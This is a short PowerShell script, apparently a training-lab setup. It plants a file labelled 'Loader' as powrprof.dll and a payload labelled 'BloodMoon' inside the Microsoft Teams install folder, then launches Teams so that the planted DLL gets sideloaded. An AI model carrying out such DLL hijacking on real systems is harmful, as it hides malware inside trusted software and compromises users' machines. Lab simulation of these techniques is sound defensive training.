# Transfer files into install dir
Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\Lunar_prof.bin" "C:\Users\pslearner\AppData\Local\Microsoft\Teams\current\powrprof.dll"    # Loader
Copy-Item "C:\Users\Public\Desktop\LAB_FILES\MS_Plugin\FirstHook\ffmpeg.dat" "C:\Users\pslearner\AppData\Local\Microsoft\Teams\current\ffmpeg.dat"          # BloodMoon

# After restart
Start-Job -ScriptBlock { Start-Process -PSPath 'C:\Users\pslearner\AppData\Local\Microsoft\Teams\Updates.exe' -argumentList "--processStart Teams.exe" }

echo "Done!" > C:\Users\Public\Desktop\LAB_FILES\Installed.txt
